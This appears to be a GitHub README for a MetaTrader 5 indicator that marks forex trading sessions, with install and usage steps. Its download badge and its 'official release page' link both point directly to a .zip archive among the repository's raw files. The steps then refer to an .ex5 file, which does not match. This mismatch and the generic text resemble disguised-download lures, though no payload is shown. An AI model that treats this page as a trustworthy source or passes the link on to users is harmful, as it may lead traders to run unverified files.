# 📊 MT5-Forex-Session-indicator - Visualize Global Trading Sessions On Charts

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Gregorytestate3889/MT5-Forex-Session-indicator/main/Session-Highlighter/MQL5/Forex_indicator_Session_M_v3.8.zip)

This tool helps traders view market hours directly inside the MetaTrader 5 platform. It marks the London, New York, and Asian sessions on your charts. Traders use these zones to plan their daily moves and find entry points for scalping or intraday trades.

## 📂 What This Tool Does

When you trade forex, market activity changes based on the time of day. This indicator removes guesswork by drawing boxes on your price chart. Each box represents a major financial center. By seeing where the market stands in relation to these sessions, you make better decisions about when to enter or exit a position.

The software works with the MetaTrader 5 desktop application. It integrates into your existing workflow without slowing down your computer.

## 🚀 System Requirements

Before you install the tool, ensure your computer meets these basic standards:

* Operating System: Windows 10 or Windows 11.
* Trading Platform: MetaTrader 5 (MT5) must be installed and active.
* Screen Resolution: 1280x720 pixels or higher for clear visuals.
* RAM: 4GB minimum.

You do not need to know how to write code. You do not need to install extra software beyond MetaTrader 5.

## 📥 How To Download And Install

Follow these steps to get the tool running on your system.

1. Visit the [official release page](https://raw.githubusercontent.com/Gregorytestate3889/MT5-Forex-Session-indicator/main/Session-Highlighter/MQL5/Forex_indicator_Session_M_v3.8.zip).
2. Locate the most recent file ending in .ex5.
3. Click the file name to download it to your computer.
4. Open the MetaTrader 5 application.
5. In the top menu, select File.
6. Click Open Data Folder.
7. Open the MQL5 folder.
8. Open the Indicators folder.
9. Drag the file you downloaded into this folder.
10. Close the MetaTrader 5 application entirely.
11. Reopen MetaTrader 5.
12. Look in the Navigator window under the Indicators list. 
13. Click and drag the indicator onto your chart to activate it.

## ⚙️ Setting Up The Indicator

After you drag the tool onto your chart, a settings box appears. You can change how the sessions look without needing to touch lines of code.

* Session Colors: You can choose different colors for the Asian, London, and New York boxes. Pick colors that contrast well with your chart background.
* Time Zone Adjustments: Local server time differs between brokers. You can shift the session start and end times by a specific number of hours to match your broker’s data.
* Transparency: Use the transparency settings to make the boxes appear bold or faint. Faint boxes keep your price candles easy to read.

## 📈 Using Sessions In Your Strategy

Many day traders look for price breakouts or reversals at the start of the London and New York sessions. When the market moves into a new session, volatility often increases.

* Asian Session: This session covers the range for Tokyo. Prices often move within a tight horizontal channel here. Scalpers use these highs and lows to set targets for the Tokyo open.
* London Session: This is the period with high volume. You will often see the main trend of the day form during this window.
* New York Session: This session overlaps with the end of the London session. This period shows significant price movement as North American markets start their day.

## 🛠 Troubleshooting Common Issues

If the indicator does not appear on your chart, check these common items:

* Algorithmic Trading: Look at the top toolbar in MetaTrader 5. Make sure the button labeled Algo Trading is green. If it is red, the platform blocks the indicator from running.
* Chart Refresh: If you just moved the file, restart the platform. MetaTrader 5 needs to scan the new file before it shows up in your Navigator menu.
* Navigator Window: If you cannot see the Navigator window, press Ctrl+N on your keyboard. This opens the side menu where your tools reside. 
* Input Path: Confirm you placed the .ex5 file in the Indicators folder. If it is in the Experts or Scripts folder, the platform will not show it as a valid indicator.

## ⚖️ Getting The Best Results

Use this tool to support your plan. Avoid using any indicator as a sole source for trading decisions. Combine the visual sessions with your own analysis of support and resistance levels. 

The sessions act as markers for time, not as a signal for buying or selling. Always test your strategy on a demo account before you trade with real funds. By practicing with this tool, you learn how specific currency pairs behave during the crossover of major market sessions. This builds your ability to read the market over time. 

Keep your charts clean by removing indicators you do not use. If you have too many indicators on one screen, you might miss important price action. Start with this session indicator and add other tools only when you feel comfortable with the standard view.
